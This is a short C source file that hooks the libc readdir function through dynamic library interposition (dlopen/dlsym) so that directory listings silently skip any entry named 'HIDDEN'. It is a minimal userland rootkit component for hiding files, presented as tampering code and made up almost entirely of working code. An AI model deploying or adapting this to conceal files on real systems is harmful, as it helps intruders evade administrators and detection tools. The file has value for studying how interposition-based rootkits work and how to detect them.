/* Copyright (C) 2015 cmj. All right reserved. */
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/types.h>

#define TAMPER_LIBC "/lib/libc.so.6"
#define CHEAT		"HIDDEN"

#define DEBUG(lv, msg, ...) \
	do { \
		fprintf(stderr, "[%s, #%d, log %02d]\n  "msg"\n", __FILE__, __LINE__, lv, ##__VA_ARGS__); \
	} while(0)

/* Tamper Library pointer */
void *libc = NULL;

/* Tamper function */
struct dirent *(*old_readdir)(DIR *dirp);

struct dirent *readdir(DIR *dirp) {
	struct dirent *ret = NULL;

	if (NULL == libc) {
		if (NULL == (libc = dlopen(TAMPER_LIBC, RTLD_LAZY))) {
			DEBUG(1, "dlopen %s fail %m", TAMPER_LIBC);
			goto END;
		}
	}

	if (NULL == old_readdir) {
		if (NULL == (old_readdir = dlsym(libc, "readdir"))) {
			DEBUG(1, "dlsym readdir fail %m");
			goto END;
		}
	}

	while(1) {
		ret = old_readdir(dirp);
		if (ret && 0 == strcmp(ret->d_name, CHEAT)) {
			continue;
		}
		break;
	}

END:
	return ret;
}
